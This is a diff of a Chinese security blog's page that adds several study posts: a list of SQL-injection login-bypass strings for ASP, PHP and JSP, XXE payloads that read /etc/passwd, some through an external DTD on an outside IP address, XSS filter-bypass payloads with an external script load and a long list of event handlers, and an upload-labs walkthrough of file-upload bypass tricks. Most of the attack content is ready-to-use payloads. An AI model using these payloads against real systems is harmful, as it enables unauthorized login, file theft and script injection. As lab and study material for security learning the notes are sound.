@@ -70,10 +70,349 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-万能密码" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/07/02/hello-world/" class="article-date">
-  <time datetime="2019-07-02T09:47:51.651Z" itemprop="datePublished">2019-07-02</time>
+    <a href="/2019/07/02/万能密码/" class="article-date">
+  <time datetime="2019-07-02T13:25:44.082Z" itemprop="datePublished">2019-07-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="asp、aspx、php、jsp万能密码大全"><a href="#asp、aspx、php、jsp万能密码大全" class="headerlink" title="asp、aspx、php、jsp万能密码大全"></a>asp、aspx、php、jsp万能密码大全</h2><h3 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h3><ol>
+<li><p>“or “a”=”a </p>
+</li>
+<li><p>‘)or(‘a’=’a </p>
+</li>
+<li><p>or 1=1– </p>
+</li>
+<li><p>‘or 1=1– </p>
+</li>
+<li><p>a’or’ 1=1– </p>
+</li>
+<li><p>“or 1=1– </p>
+</li>
+<li><p>‘or’a’=’a </p>
+</li>
+<li><p>“or”=”a’=’a </p>
+</li>
+<li><p>‘or’’=’ </p>
+</li>
+<li><p>‘or’=’or’ </p>
+</li>
+<li><p>1 or ‘1’=’1’=1 </p>
+</li>
+<li><p>1 or ‘1’=’1’ or 1=1 </p>
+</li>
+<li><p>‘OR 1=1%00 </p>
+</li>
+<li><p>“or 1=1%00 </p>
+</li>
+<li><p>‘xor </p>
+</li>
+<li><p>用户名 ‘ UNION Select 1,1,1 FROM admin Where ‘’=’ （替换表名admin） 密码 1 </p>
+</li>
+<li><p>admin’ or ‘a’=’a 密码随便</p>
+</li>
+</ol>
+<h3 id="PHP万能密码"><a href="#PHP万能密码" class="headerlink" title="PHP万能密码"></a>PHP万能密码</h3><blockquote>
+<p>‘or 1=1/* User: something Pass: ‘ or ‘1’=’1</p>
+</blockquote>
+<h3 id="jsp-万能密码"><a href="#jsp-万能密码" class="headerlink" title="jsp 万能密码"></a>jsp 万能密码</h3><blockquote>
+<p>1’or’1’=’1 admin’ or 1=1/*</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://topman.online/2019/07/02/万能密码/" data-id="cjxluht900004ts1yk7awijtu" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xxe" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/02/xxe/" class="article-date">
+  <time datetime="2019-07-02T13:25:44.080Z" itemprop="datePublished">2019-07-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h2><h2 id="XML文档"><a href="#XML文档" class="headerlink" title="XML文档"></a>XML文档</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">    &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">    &lt;!ELEMENT to   (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT from   (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT heading   (#PCDATA)&gt;</span><br><span class="line">    &lt;!ELEMENT body   (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;&lt;/to&gt;</span><br><span class="line">&lt;from&gt;&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD外部实体声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD外部DTD文档，再引入外部实体声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http://47.107.155.236/dtd.dtd&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+
+<p>dtd.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过DTD外部实体声明，引入外部实体声明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">    &lt;!ENTITY % b SYSTEM &quot;http://47.107.155.236/dtd.dtd&quot;&gt;</span><br><span class="line">    %b;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+
+<p>dtd.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>默认支持协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libxml2  : file http ftp</span><br><span class="line">php : file httpd ftp php compress.zlib compress.bzip2 data glob phar</span><br><span class="line">java  : http https ftp file jar netdoc mailto gopher *</span><br><span class="line">asp   : file http https ftp</span><br></pre></td></tr></table></figure>
+
+<p>php扩展协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https ftps zip ssh2.shell/exec/tunnel/sftp/scp rar ogg expect</span><br></pre></td></tr></table></figure>
+
+<p>防御方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字 system public</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://topman.online/2019/07/02/xxe/" data-id="cjxluht8w0003ts1ygt6on2ow" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/02/xss/" class="article-date">
+  <time datetime="2019-07-02T13:25:44.077Z" itemprop="datePublished">2019-07-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote>
+<p>初始测试,并判断是否触发规则</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(top);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt(top);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;confirm(top);&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;https://topxu.com/con.js&quot;&gt;</span><br><span class="line">&lt;a href=&quot;http://www.baidu.com&quot;&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>绕过规则</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;scRiPt&gt;alert(top);&lt;/scrIPt&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(top);&lt;/scr&lt;/script&gt;ipt&gt;</span><br><span class="line">&lt;a href=&quot;javascript:alert(top)&quot;&gt;click&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;cncncncncncn.com&quot; onclimbatree=alert(top)&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; &lt;a&gt; &lt;p&gt; &lt;img&gt; &lt;body&gt; &lt;button&gt; &lt;var&gt; &lt;div&gt; &lt;iframe&gt; &lt;object&gt; &lt;input&gt; &lt;select&gt; &lt;textarea&gt; &lt;keygen&gt; &lt;frameset&gt; &lt;embed&gt; &lt;svg&gt; &lt;math&gt; &lt;video&gt; &lt;audio&gt;</span><br><span class="line">FSCommand() （攻击者可以在嵌入式Flash对象内执行时使用此功能）</span><br><span class="line">onAbort() （当用户中止加载图像时）</span><br><span class="line">onActivate() （当对象被设置为活动元素时）</span><br><span class="line">onAfterPrint() （在用户打印或预览打印作业后激活）</span><br><span class="line">onAfterUpdate() （在更新源对象中的数据后激活数据对象）</span><br><span class="line">onBeforeActivate() （在对象设置为活动元素之前触发）</span><br><span class="line">onBeforeCopy()（攻击者在将选择复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该execCommand(&quot;Copy&quot;)功能执行此操作）</span><br><span class="line">onBeforeCut() （攻击者在选择被切断之前执行攻击字符串）</span><br><span class="line">onBeforeDeactivate() （在activeElement从当前对象改变之后立即激活）</span><br><span class="line">onBeforeEditFocus() （在包含在可编辑元素中的对象进入UI激活状态之前触发，或者选择了可编辑容器对象时）</span><br><span class="line">onBeforePaste()（用户需要欺骗粘贴或使用该execCommand(&quot;Paste&quot;)功能强制进入）</span><br><span class="line">onBeforePrint()（用户需要欺骗打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)功能）。</span><br><span class="line">onBeforeUnload() （用户需要欺骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父项产生的）</span><br><span class="line">onBeforeUpdate() （在更新源对象中的数据之前在数据对象上激活）</span><br><span class="line">onBegin() （onbegin事件在元素时间轴开始时立即触发）</span><br><span class="line">onBlur() （在另一个弹出窗口被加载并且窗口失去焦点的情况下）</span><br><span class="line">onBounce() （当选取框对象的行为属性设置为“alternate”并且选取框的内容到达窗口的一侧时触发）</span><br><span class="line">onCellChange() （当数据提供者中的数据更改时触发）</span><br><span class="line">onChange() （select，text或TEXTAREA字段失去焦点并且其值已被修改）</span><br><span class="line">onClick() （有人点击表格）</span><br><span class="line">onContextMenu() （用户需要右击攻击区域）</span><br><span class="line">onControlSelect() （当用户准备对对象进行控制选择时触发）</span><br><span class="line">onCopy()（用户需要复制一些东西，或者可以使用execCommand(&quot;Copy&quot;)命令利用它）</span><br><span class="line">onCut()（用户需要复制一些东西，或者可以使用execCommand(&quot;Cut&quot;)命令利用它）</span><br><span class="line">onDataAvailable() （用户需要更改元素中的数据，否则攻击者可能会执行相同的功能）</span><br><span class="line">onDataSetChanged() （当数据源对象暴露的数据集发生更改时触发）</span><br><span class="line">onDataSetComplete() （触发表明所有数据都可从数据源对象中获得）</span><br><span class="line">onDblClick() （用户双击表单元素或链接）</span><br><span class="line">onDeactivate() （当activeElement从当前对象更改为父文档中的另一个对象时触发）</span><br><span class="line">onDrag() （要求用户拖动一个对象）</span><br><span class="line">onDragEnd() （要求用户拖动一个对象）</span><br><span class="line">onDragLeave() （要求用户从有效位置拖动对象）</span><br><span class="line">onDragEnter() （要求用户将对象拖入有效的位置）</span><br><span class="line">onDragOver() （要求用户将对象拖入有效的位置）</span><br><span class="line">onDragDrop() （用户将一个对象（例如文件）放到浏览器窗口中）</span><br><span class="line">onDragStart() （在用户开始拖动操作时发生）</span><br><span class="line">onDrop() （用户将一个对象（例如文件）放到浏览器窗口中）</span><br><span class="line">onEnd() （onEnd事件在时间轴结束时触发。</span><br><span class="line">onError() （加载文档或图像会导致错误）</span><br><span class="line">onErrorUpdate() （在更新数据源对象中的关联数据时发生错误时触发数据绑定对象）</span><br><span class="line">onFilterChange() （视觉滤镜完成状态变化时触发）</span><br><span class="line">onFinish() （当选取框完成循环时攻击者可以创建漏洞）</span><br><span class="line">onFocus() （攻击者在窗口焦点时执行攻击字符串）</span><br><span class="line">onFocusIn() （攻击者在窗口获得焦点时执行攻击字符串）</span><br><span class="line">onFocusOut() （攻击者在窗口失焦时执行攻击字符串）</span><br><span class="line">onHashChange() （当文档当前地址的分段标识符部分改变时触发）</span><br><span class="line">onHelp() （攻击者在窗口焦点时用户击中F1时执行攻击字符串）</span><br><span class="line">onInput() （元素的文本内容通过用户界面进行更改）</span><br><span class="line">onKeyDown() （用户按下一个键）</span><br><span class="line">onKeyPress() （用户按下或按住一个键）</span><br><span class="line">onKeyUp() （用户释放一个密钥）</span><br><span class="line">onLayoutComplete() （用户将不得不打印或打印预览）</span><br><span class="line">onLoad() （攻击者在窗口加载后执行攻击字符串）</span><br><span class="line">onLoseCapture()（可以被该releaseCapture()方法利用）</span><br><span class="line">onMediaComplete() （当使用流媒体文件时，该事件可能在文件开始播放之前触发）</span><br><span class="line">onMediaError() （用户在浏览器中打开包含媒体文件的页面，并在出现问题时触发该事件）</span><br><span class="line">onMessage() （文档收到消息时触发）</span><br><span class="line">onMouseDown() （攻击者需要让用户点击图片）</span><br><span class="line">onMouseEnter() （光标在物体或区域上移动）</span><br><span class="line">onMouseLeave() （攻击者需要让用户将鼠标悬停在图像或表格上，然后再关闭）</span><br><span class="line">onMouseMove() （攻击者需要让用户将鼠标悬停在图像或表格上）</span><br><span class="line">onMouseOut() （攻击者需要让用户将鼠标悬停在图像或表格上，然后再关闭）</span><br><span class="line">onMouseOver() （光标在物体或区域上移动）</span><br><span class="line">onMouseUp() （攻击者需要让用户点击图片）</span><br><span class="line">onMouseWheel() （攻击者需要让用户使用鼠标滚轮）</span><br><span class="line">onMove() （用户或攻击者会移动页面）</span><br><span class="line">onMoveEnd() （用户或攻击者会移动页面）</span><br><span class="line">onMoveStart() （用户或攻击者会移动页面）</span><br><span class="line">onOffline() （如果浏览器在在线模式下工作，并且它开始脱机工作，则会发生）</span><br><span class="line">onOnline() （如果浏览器在脱机模式下工作并且它开始联机工作，则会发生此问题）</span><br><span class="line">onOutOfSync() （中断元素按时间轴定义播放媒体的能力）</span><br><span class="line">onPaste()（用户需要粘贴或攻击者可以使用该execCommand(&quot;Paste&quot;)功能）</span><br><span class="line">onPause() （onpause事件在时间线暂停时激活的每个元素都会触发，包括body元素）</span><br><span class="line">onPopState() （当用户导航会话历史时触发）</span><br><span class="line">onProgress() （攻击者会在加载时使用这个flash动画）</span><br><span class="line">onPropertyChange() （用户或攻击者需要更改元素属性）</span><br><span class="line">onReadyStateChange() （用户或攻击者需要更改元素属性）</span><br><span class="line">onRedo() （用户在撤消交易历史记录中前进）</span><br><span class="line">onRepeat() （对于时间线的每次重复，事件触发一次，不包括第一个完整周期）</span><br><span class="line">onReset() （用户或攻击者重置表单）</span><br><span class="line">onResize()（用户将调整窗口大小;攻击者可以使用类似的方式自动初始化&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResizeEnd()（用户将调整窗口大小;攻击者可以使用类似的方式自动初始化&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResizeStart()（用户将调整窗口大小;攻击者可以使用类似的方式自动初始化&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;）</span><br><span class="line">onResume() （onresume事件触发时间线恢复时变为活动的每个元素，包括body元素）</span><br><span class="line">onReverse() （如果元素的repeatCount大于1，则每次时间线开始向后播放时都会触发此事件）</span><br><span class="line">onRowsEnter() （用户或攻击者需要更改数据源中的一行）</span><br><span class="line">onRowExit() （用户或攻击者需要更改数据源中的一行）</span><br><span class="line">onRowDelete() （用户或攻击者需要删除数据源中的一行）</span><br><span class="line">onRowInserted() （用户或攻击者需要在数据源中插入一行）</span><br><span class="line">onScroll()（用户需要滚动，或攻击者可以使用该scrollBy()功能）</span><br><span class="line">onSeek() （当时间线设置为向前以外的任何方向播放时，反向事件触发）</span><br><span class="line">onSelect()（用户需要选择一些文本 - 攻击者可以用类似的东西自动初始化window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectionChange()（用户需要选择一些文本 - 攻击者可以用类似的东西自动初始化window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onSelectStart()（用户需要选择一些文本 - 攻击者可以用类似的东西自动初始化window.document.execCommand(&quot;SelectAll&quot;);）</span><br><span class="line">onStart() （在每个选取框循环开始时触发）</span><br><span class="line">onStop() （用户需要按停止按钮或离开网页）</span><br><span class="line">onStorage() （存储区已更改）</span><br><span class="line">onSyncRestored() （用户中断元素播放由时间轴定义的媒体播放的能力）</span><br><span class="line">onSubmit() （要求攻击者或用户提交表单）</span><br><span class="line">onTimeError() （用户或攻击者将时间属性（如dur）设置为无效值）</span><br><span class="line">onTrackChange() （用户或攻击者在播放列表中更改轨道）</span><br><span class="line">onUndo() （用户在撤销交易历史记录中倒退）</span><br><span class="line">onUnload() （当用户点击任何链接或按下后退按钮或攻击者强制点击）</span><br><span class="line">onURLFlip() （当由HTML + TIME（定时交互式多媒体扩展）媒体标签播放的高级流格式（ASF）文件处理嵌入在ASF文件中的脚本命令时，该事件触发）</span><br><span class="line">seekSegmentTime() （这是一种方法，它在元素的分段时间线上定位指定点并从该点开始播放，该分段包含一个时间线重复，包括使用AUTOREVERSE属性的反向播放。）</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://topman.online/2019/07/02/xss/" data-id="cjxluht920005ts1y0xbk02q0" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-upload-labs" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/02/upload-labs/" class="article-date">
+  <time datetime="2019-07-02T13:25:44.075Z" itemprop="datePublished">2019-07-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><blockquote>
+<p>前端绕过，上次jpg文件，通过burpsuite修改后缀名,上传成功</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less1.png" alt="less-1"></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><blockquote>
+<p>观察源码，发现检测MIME类型</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less2-1.png" alt></p>
+<blockquote>
+<p>判断修改MIME类型为：image/jpeg</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less2-2.png" alt></p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><blockquote>
+<p>观察源码，发现检测后缀名，黑名单</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less3-1.png" alt></p>
+<blockquote>
+<p>上传图片，修改后缀名为phtml,php5</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less3-2.png" alt></p>
+<blockquote>
+<p>上传成功，后通过右击，访问图片地址。</p>
+</blockquote>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><blockquote>
+<p>观察源码，发现后缀名黑名单（几乎全部）</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less4-1.png" alt></p>
+<blockquote>
+<p>通过上传.htaccess 文件，进行解析，内容如下：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上传图片马，直接访问，将被解析</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less4-2.png" alt></p>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><blockquote>
+<p>查看源代码，发现还是黑名单过滤，并且添加了.htaccess，但是没有转换成小写，这里使用大小写绕过</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less5-1.png" alt></p>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less5-3.png" alt></p>
+<blockquote>
+<p>通过burpsuite修改，使用后缀大小绕过检测</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less5-2.png" alt></p>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><blockquote>
+<p>查看源代码，发现还是黑名单过滤，发现没有做去空处理</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less6-1.png" alt></p>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less6-2.png" alt></p>
+<blockquote>
+<p>使用是空格绕过</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less6-3.png" alt></p>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><blockquote>
+<p>观察源码，发现代码缺少deldot()函数处理字符串末尾的点</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less7-1.png" alt></p>
+<blockquote>
+<p>利用windows系统的命名特性，后缀名添加 点进行绕过</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less7-2.png" alt></p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><blockquote>
+<p>查看源码，通过发现还是通过黑名单检测过滤</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less8-1.png" alt></p>
+<blockquote>
+<p>利用windows的系统命名特性，使用”::$DATA”，进行绕过</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less8-2.png" alt></p>
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><blockquote>
+<p>查看源码，发现和之前一样</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less9-1.png" alt></p>
+<blockquote>
+<p>利用处理后缀名方式进行处理，使用点空点，将之变成less-8</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less9-2.png" alt></p>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><blockquote>
+<p>观察源代码，发现使用 str_ireplace()函数将黑名单中文件后缀 替换文件后缀名为空</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less10-1.png" alt></p>
+<blockquote>
+<p>使用双写后缀名绕过</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less10-2.png" alt></p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><blockquote>
+<p>00截断 不好使😂😂😂😒😒😒</p>
+</blockquote>
